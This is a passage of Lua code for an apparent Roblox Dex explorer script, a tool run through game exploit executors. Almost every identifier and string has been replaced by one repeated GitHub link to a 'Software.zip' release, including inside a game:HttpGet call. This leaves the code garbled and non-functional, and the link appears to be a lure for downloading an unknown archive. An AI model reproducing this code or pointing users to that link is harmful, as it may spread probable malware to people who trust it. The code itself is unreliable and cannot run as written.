		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({Name = "Click part to select", IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, Icon = 6, OnClick = function(callback)
			if callback then
				local mouse = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				cptsOnMouseClick = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
					pcall(function()
						local object = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						if nodes[object] then
							selection:Set(nodes[object])
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(nodes[object])
						end
					end)
				end)
			else if cptsOnMouseClick ~= nil then cptsOnMouseClick:Disconnect() cptsOnMouseClick = nil end end
		end})
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(gui)
	end
	
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
		local writefile, makefolder = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		makefolder("dex")
		makefolder("dex/assets")
		makefolder("dex/saved")
		makefolder("dex/plugins")
		makefolder("dex/ModuleCache")
	end
	
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[1]
	end
	
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = pcall(function() local a = cloneref(game["Run Service"].Parent:GetService("CoreGui")):GetFullName() end)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		
		-- Load Lib
		local intro = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Initializing Library")
		Lib = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Lib")
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		
		-- Init other stuff
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		
		-- Init icons
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("rbxassetid://6511490623",256,256,16,16)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({
			Reference = 0,             Cut = 1,                         Cut_Disabled = 2,      Copy = 3,               Copy_Disabled = 4,    Paste = 5,                Paste_Disabled = 6,
			Delete = 7,                Delete_Disabled = 8,             Group = 9,             Group_Disabled = 10,    Ungroup = 11,         Ungroup_Disabled = 12,    TeleportTo = 13,
			Rename = 14,               JumpToParent = 15,               ExploreData = 16,      Save = 17,              CallFunction = 18,    CallRemote = 19,          Undo = 20,
			Undo_Disabled = 21,        Redo = 22,                       Redo_Disabled = 23,    Expand_Over = 24,       Expand = 25,          Collapse_Over = 26,       Collapse = 27,
			SelectChildren = 28,       SelectChildren_Disabled = 29,    InsertObject = 30,     ViewScript = 31,        AddStar = 32,         RemoveStar = 33,          Script_Disabled = 34,
			LocalScript_Disabled = 35, Play = 36,                       Pause = 37,            Rename_Disabled = 38
		})
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("rbxassetid://6579106223",256,256,32,32)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({
			Explorer = 0, Properties = 1, Script_Viewer = 2,
		})
		
		-- Fetch version if needed
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Fetching Roblox Version",0.2)
		if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
			local fileVer = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = Version()
			if fileVer then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(fileVer,"\n")
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[2]
				end
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or game:HttpGet("https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip")
		end
		
		-- Fetch external deps
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Fetching API",0.35)
		API = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Fetching RMD",0.5)
		RMD = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		
		-- Save external deps locally if needed
		if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() then
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"\n"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		end
		
		-- Load other modules
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Loading Modules",0.75)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()) -- Missing deps now available
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		
		-- Init other modules
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Initializing Modules",0.9)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		
		-- Done
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Complete",1)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1.25)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end)()
		
		-- Init window system, create main menu, show explorer and properties
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({Align = "right", Pos = 1, Size = 0.5, Silent = true})
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip({Align = "right", Pos = 2, Size = 0.5, Silent = true})
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("right") end)
	end
	
	return Main
end)()

-- Start
https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
